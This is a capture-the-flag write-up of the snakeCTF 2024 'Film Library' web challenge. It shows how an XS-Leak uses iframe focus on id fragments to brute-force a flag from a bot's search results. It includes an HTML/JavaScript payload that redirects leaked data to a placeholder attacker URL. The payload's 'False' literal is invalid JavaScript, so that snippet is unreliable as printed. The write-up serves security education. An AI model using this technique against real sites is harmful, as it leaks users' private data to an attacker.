# Film Library [_snakeCTF 2024 Quals_]

**Category**: web

## Description

I made this little app to track the movies I watch.

### Hints

- Uh, what's that count for?

## Solution

The challenge is made of a simple app and a bot.
The application purpose is to store film data (`title` and `description`) in the `session` cookie and allow users to search them.
The bot represents a user who can interact with the app, and the flag is stored in the description of one of his films:

```js
    let page = await browser.newPage();
    ...
    await page.goto(process.env.PAGE_URL + "/add", {
      waitUntil: "networkidle2",
      timeout: 10000,
    });

    await page.type("#title", "The lovely film about the flag");
    await page.type("#description", process.env.FLAG);
    await page.click("#submit");

    console.log(`Admin navigating to ${url}`);
    await page.goto(url, {
      waitUntil: "networkidle2",
      timeout: 10000,
    });
```

The cookie attribute `SameSite` is set to `None`. This means that it is sent inside every request to the server.
The cookie is not directly accessible from the response of a request, for example using `fetch`, because of [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) is applied because no [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) headers are set. Even if one could find an XSS it wouldn't be easily exploitable, since the cookie is set to `httpOnly`.

The application uses [pugjs](https://pugjs.org/api/getting-started.html) to render pages, but no template injection seems to be present because templates are always compiled from the files.

First, one can notice that the search endpoint allows searching for both title and description of the films:

```js
    ...
    let films = req.session.films;
    let filter = req.query.filter;
    let filtered = films.filter((x) => {
      return x.title.includes(filter) || x.description.includes(filter);
    });
    ...
```

Since the bot has the flag inside the description of a film, any oracle to detect the presence/absence of the result can be used to bruteforce the result of the query!
To this end, the attributes id can be used, since they are present in the resulting page:

```js
    search result for #{query}
    each film in result
        div
            a(href="/film?id=" + film.id, id="film-" + film.id, name="film-" + film.id) #{film.title}
```

This kind of attack is called [XS-Leak](https://xsleaks.dev/), more precisely targeting the [id attribute](https://xsleaks.dev/docs/attacks/id-attribute/), and can be performed using iframes:

- The iframe will load the search page with a specific query, such as `snakectf{a`
- The URL will have a fragment to the id attribute, such as `#film-0`
- If the element with the specified id is present, the iframe will get the focus
- JavaScript can be used to detect whether the focus has moved, using `window.document.activeElement`

This is an example payload:

```html
<html>
  <body>
    <script>
      let iframe;
      let found = False;
      iframe = document.createElement("iframe");
      iframe.src = "<challenge_url>/search?filter=snakeCTF{a#film-0";
      document.body.appendChild(iframe);
      setInterval(() => {
        if (document.activeElement != document.body && !found) {
          //console.log(window.document.activeElement);
          const u = new URL(window.document.activeElement.src);
          document.location =
            "<attacker_controlled_url>/" + u.searchParams.get("filter");
          found = true;
        }
      }, 20);
    </script>
  </body>
</html>
```

With this payload, every 20 ms JavaScript checks whether the iframe stole the focus, and if it will perform a redirect the attacker page.
The exploit can be automated and optimized, as given in the [attachments](./attachments/solver.py).
